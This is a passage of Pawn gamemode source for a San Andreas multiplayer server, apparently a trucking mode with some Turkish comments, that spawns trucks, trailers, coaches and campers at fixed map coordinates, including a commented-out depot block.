	LastVehicleID = Vehicle_AddStatic(455,-1599.5134000,-2694.9324000,49.0558000,160.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(455,-1603.3716000,-2693.5229000,49.0558000,160.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(455,-1607.3059000,-2692.0891000,49.0558000,160.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(455,-1611.3669000,-2690.6604000,49.0558000,162.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(584,-1518.7354000,-2753.4282000,49.0558000,116.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(450,-1506.6024000,-2778.6230000,49.0478000,54.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(584,-1516.8472000,-2757.1248000,49.0558000,116.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(584,-1514.9667000,-2760.8088000,49.0558000,116.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(584,-1511.0060000,-2768.3372000,49.0558000,116.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(584,-1512.9659000,-2764.6580000,49.0558000,116.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1549.2390000,-2761.9399000,48.5491000,-13.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1583.3479000,-2703.3928000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1578.5148000,-2705.9783000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1573.6766000,-2708.8835000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1569.0411000,-2711.2893000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1564.4053000,-2714.1062000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1559.6003000,-2716.7510000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1555.0222000,-2719.4221000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1553.7013000,-2759.3418000,48.5491000,-13.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1558.0935000,-2756.4414000,48.5491000,-13.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1562.6150000,-2753.3054000,48.5491000,-13.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1567.4569000,-2750.2942000,48.5491000,-13.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1572.3512000,-2747.0322000,48.5491000,-15.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1576.8103000,-2744.0017000,48.5491000,-15.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1581.0861000,-2740.8975000,48.5491000,-15.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(437,-1585.3212000,-2737.9192000,48.5491000,-15.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1542.8480000,-2726.4392000,49.0558000,139.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1540.1091000,-2728.9067000,49.0558000,138.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1537.4617000,-2731.3262000,49.0558000,136.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1535.0638000,-2733.6692000,49.0558000,136.0000000,-1,-1,15);

/*
Objects converted: 0
Vehicles converted: 174
Vehicle models found: 8
----------------------
In the time this conversion took to finish a hummingbird could have flapped it's wings 1.27 times!
*/

	// Gizli Araçlar
	LastVehicleID = Vehicle_AddStatic(411,-2845.7283,2185.8210,175.3890,31.3000,0,0, 120); // GizliÝnfernusSon
	LastVehicleID = Vehicle_AddStatic(487,-2227.5222,2326.2468,7.7246,359.5768,1,1, 120); // HeliGizli
	LastVehicleID = Vehicle_AddStatic(446,-1961.9841,1509.5554,-0.4302,129.8103,0,0, 120); // GizliTekne
}

/*
// Add trucks and trailers to the truck-stops
GameModeInit_TruckDepots()
{
	// Add trailers, trucks , Flatbeds and "DFT-30" to Fallen Tree Depot (Class 0)
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -475.0, -523.0, 26.0, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -475.0, -518.0, 26.0, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -475.0, -513.0, 26.0, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -475.0, -508.0, 26.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -475.0, -503.0, 26.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -475.0, -498.0, 26.0, 90.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -475.0, -493.0, 26.0, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -475.0, -488.0, 26.0, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -475.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -480.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -485.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -490.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -495.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -500.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -505.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -510.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -515.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -520.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -525.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -530.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -535.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -540.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -545.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -550.0, -475.0, 26.0, 180.0, random(126), random(126), 600); // Flatbed

	// Add "Flatbed" and "DFT-30" trucks to Flint Trucking Depot (Class 1)
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -77.0, -1109.0, 1.25, 160.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -72.0, -1112.0, 1.25, 160.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -67.0, -1114.0, 1.25, 160.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -30.0, -1128.0, 1.25, 160.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -41.0, -1152.0, 1.25, 335.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -46.0, -1150.0, 1.25, 335.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -51.0, -1148.0, 1.25, 335.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -56.0, -1146.0, 1.25, 335.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -61.0, -1144.0, 1.25, 335.0, random(126), random(126), 600); // Flatbed

	// Add trailers, trucks , Flatbeds and "DFT-30" to LVA Freight Depot (Class 2)
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1467.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1472.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1445.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1440.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1435.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1430.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1420.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1415.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1410.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1405.0, 975.0, 11.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, 1490.0, 1015.0, 11.0, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, 1490.0, 1020.0, 11.0, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, 1490.0, 1025.0, 11.0, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, 1490.0, 1030.0, 11.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, 1490.0, 1035.0, 11.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, 1490.0, 1040.0, 11.0, 90.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, 1490.0, 1045.0, 11.0, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, 1490.0, 1050.0, 11.0, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, 1490.0, 1055.0, 11.0, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, 1490.0, 1060.0, 11.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, 1490.0, 1065.0, 11.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, 1490.0, 1070.0, 11.0, 90.0, random(126), random(126), 600); // Roadtrain

	// Add trailers, trucks , Flatbeds and "DFT-30" to Doherty Depot (Class 3)
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -2105.0, -200.0, 35.5, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -2105.0, -205.0, 35.5, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -2105.0, -210.0, 35.5, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -2105.0, -215.0, 35.5, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -2105.0, -220.0, 35.5, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -2105.0, -225.0, 35.5, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -2105.0, -230.0, 35.5, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -2105.0, -235.0, 35.5, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -2105.0, -240.0, 35.5, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -2105.0, -245.0, 35.5, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -2105.0, -250.0, 35.5, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -2105.0, -255.0, 35.5, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -2105.0, -260.0, 35.5, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -2105.0, -265.0, 35.5, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -2105.0, -270.0, 35.5, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -2144.0, -186.0, 35.5, 270.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -2144.0, -191.0, 35.5, 270.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -2144.0, -196.0, 35.5, 270.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -2144.0, -201.0, 35.5, 270.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -2144.0, -206.0, 35.5, 270.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -2144.0, -211.0, 35.5, 270.0, random(126), random(126), 600); // Roadtrain

	// Add trailers, trucks , Flatbeds and "DFT-30" to El Corona Depot (Class 4)
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, 1805.0, -2025.0, 14.0, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, 1805.0, -2030.0, 14.0, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, 1805.0, -2035.0, 14.0, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, 1805.0, -2040.0, 14.0, 90.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, 1805.0, -2045.0, 14.0, 90.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, 1805.0, -2050.0, 14.0, 90.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1745.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1750.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, 1755.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, 1760.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, 1765.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, 1770.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, 1775.0, -2070.0, 14.0, 0.0, random(126), random(126), 600); // Roadtrain

	// Add trailers, trucks , Flatbeds and "DFT-30" to Las Payasdas Depot (Class 5)
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2635.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2630.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2625.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2620.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2615.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2610.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2605.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2600.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2595.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2590.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2585.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2580.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2575.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2570.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2565.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -535.0, 2560.0, 54.0, 270.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -535.0, 2555.0, 54.0, 270.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -535.0, 2550.0, 54.0, 270.0, random(126), random(126), 600); // Liquids trailer

	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -512.0, 2635.0, 54.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -512.0, 2630.0, 54.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -512.0, 2625.0, 54.0, 90.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -512.0, 2620.0, 54.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -512.0, 2615.0, 54.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -512.0, 2610.0, 54.0, 90.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -512.0, 2605.0, 54.0, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -512.0, 2600.0, 54.0, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleDFT30, -512.0, 2585.0, 54.0, 90.0, random(126), random(126), 600); // DFT-30
	LastVehicleID = Vehicle_AddStatic(VehicleFlatbed, -512.0, 2580.0, 54.0, 90.0, random(126), random(126), 600); // Flatbed
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -512.0, 2575.0, 54.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -512.0, 2570.0, 54.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -512.0, 2565.0, 54.0, 90.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -512.0, 2560.0, 54.0, 90.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -512.0, 2555.0, 54.0, 90.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -512.0, 2550.0, 54.0, 90.0, random(126), random(126), 600); // Roadtrain

	// Add cement-trucks at Quarry Top (Class 6)
	LastVehicleID = Vehicle_AddStatic(VehicleCementTruck, 340.0, 850.0, 21.0, 0, random(126), random(126), 600); // Cement truck
	LastVehicleID = Vehicle_AddStatic(VehicleCementTruck, 335.0, 860.0, 21.0, 0, random(126), random(126), 600); // Cement truck
	LastVehicleID = Vehicle_AddStatic(VehicleCementTruck, 330.0, 870.0, 21.0, 0, random(126), random(126), 600); // Cement truck
	LastVehicleID = Vehicle_AddStatic(VehicleCementTruck, 325.0, 880.0, 21.0, 0, random(126), random(126), 600); // Cement truck
	LastVehicleID = Vehicle_AddStatic(VehicleCementTruck, 320.0, 890.0, 21.0, 0, random(126), random(126), 600); // Cement truck

	// Add trailers and trucks to Shady Creek Depot (Class 7)
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -1545.0, -2737.00, 49.0, 145.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -1540.9, -2739.87, 49.0, 145.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -1536.8, -2742.74, 49.0, 145.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerCargo, -1532.7, -2745.61, 49.0, 145.0, random(126), random(126), 600); // Cargo trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerOre, -1528.6, -2748.48, 49.0, 145.0, random(126), random(126), 600); // Ore trailer
	LastVehicleID = Vehicle_AddStatic(VehicleTrailerFluids, -1524.5, -2751.35, 49.0, 145.0, random(126), random(126), 600); // Liquids trailer
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -1557.75, -2744.80, 49.0, 145.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -1561.85, -2741.93, 49.0, 145.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -1565.95, -2739.06, 49.0, 145.0, random(126), random(126), 600); // Roadtrain
	LastVehicleID = Vehicle_AddStatic(VehicleLineRunner, -1570.05, -2736.19, 49.0, 145.0, random(126), random(126), 600); // LineRunner
	LastVehicleID = Vehicle_AddStatic(VehicleTanker, -1574.15, -2733.32, 49.0, 145.0, random(126), random(126), 600); // Tanker
	LastVehicleID = Vehicle_AddStatic(VehicleRoadTrain, -1578.25, -2730.45, 49.0, 145.0, random(126), random(126), 600); // Roadtrain
}*/

// Add busses to the bus-depots
GameModeInit_Busses()
{
	// LS Otogar
	LastVehicleID = Vehicle_AddStatic(437,1799.7554000,-1908.7333000,13.3866000,106.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1799.3710000,-1914.1381000,13.3866000,106.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1798.7179000,-1919.2183000,13.3866000,106.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1798.6238000,-1924.7279000,13.3866000,106.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1798.5284000,-1930.0219000,13.3866000,106.0000000,-1,-1,15); //Coach
	// SF Otogar
	LastVehicleID = Vehicle_AddStatic(437,-1734.8240000,-161.8370000,3.5508000,21.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1762.9952000,-167.7531000,3.5508000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1762.9492000,-157.2776000,3.5508000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1763.1416000,-136.4197000,3.5508000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1728.4830000,-156.0770000,3.5508000,21.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1715.6829000,-143.6229000,3.5508000,21.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1748.9264000,-87.1258000,3.5508000,-115.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1748.7826000,-78.2471000,3.5508000,-115.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1749.0942000,-69.1552000,3.5508000,-115.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,-1762.8247000,-178.1008000,3.5508000,-90.0000000,-1,-1,15); //Coach
	// LV Otogar
	LastVehicleID = Vehicle_AddStatic(437,1414.0734000,674.7704000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1413.9259000,685.9233000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1413.7600000,706.3535000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1413.3535000,717.2130000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1413.9736000,745.2180000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1414.2759000,754.8011000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1414.3367000,765.6260000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1414.6615000,785.5432000,10.8194000,-90.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1445.6692000,783.7809000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1464.9242000,783.4595000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1477.4650000,783.1201000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1486.8380000,783.2323000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1509.7946000,784.2021000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1519.1948000,784.2633000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1531.8717000,784.5332000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1544.5581000,784.6135000,10.8194000,180.0000000,-1,-1,15); //Coach
	LastVehicleID = Vehicle_AddStatic(437,1452.2238000,783.5881000,10.8194000,180.0000000,-1,-1,15); //Coach

/*
Objects converted: 0
Vehicles converted: 39
Vehicle models found: 1
----------------------
In the time this conversion took to finish the US national debt has risen by about $747.73!
*/
}
GameModeInit_Dolmus()
{
	// LS Dolmuþ
	LastVehicleID = Vehicle_AddStatic(483,2186.4282000,-1806.1747000,13.3648000,-20.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2181.0200000,-1806.0621000,13.3648000,-20.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2175.6807000,-1806.1985000,13.3648000,-20.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2170.3560000,-1806.0530000,13.3648000,-20.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2165.0361000,-1806.2327000,13.3648000,-20.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2159.4749000,-1806.0325000,13.3648000,-20.0000000,-1,-1,15); //Camper
	
	// SF Dolmuþ
	LastVehicleID = Vehicle_AddStatic(483,-2271.7410000,525.8803000,35.0206000,0.0000000,-1,-1,15); //Camper
